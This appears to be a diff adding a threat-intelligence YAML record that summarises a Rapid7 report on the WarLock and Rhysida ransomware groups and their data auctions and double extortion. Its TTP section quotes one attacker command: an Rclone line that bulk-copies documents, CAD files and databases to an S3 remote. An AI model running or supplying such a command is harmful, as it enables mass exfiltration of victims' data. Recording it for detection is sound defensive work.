@@ -1,0 +1,24 @@
+description: The report discusses ransomware groups WarLock and Rhysida engaging in
+  data auctions and double extortion tactics.
+attribution: WarLock (Chinese origin), Rhysida
+TTPs:
+  processes:
+  - Rclone.exe
+  commandline:
+  - Rclone.exe copy \\\\localdirectory :s3 -P --include "*.{pdf,ai,dwg,dxf,dwt,doc,docx,dwg,dwt,dws,shx,pat,lin,ctb,dxf,dwf,step,stl,dst,dxb,,stp,ipt,prt,iges,obj,xlsx,mdf,sql,doc,xls,sql,bak,sqlite,db,sqlite3,sdf,ndf,ldf,csv,mdf,dbf,ibd,myd,ppt,pptx}"
+    -q --ignore-existing --auto-confirm --multi-thread-streams 11 --transfers 11 --max-age
+    500d --max-size 2000m
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity: []
+  persistence: []
+  process_relations: []
+authors:
+- Alexandra Blia
+- Gal Givon
+reference: https://www.rapid7.com/blog/post/tr-extortion-ecommerce-ransomware-groups-turn-breaches-into-bidding-wars-research
+date_of_publication: November 24, 2025
+file_creation_date: November 29, 2025
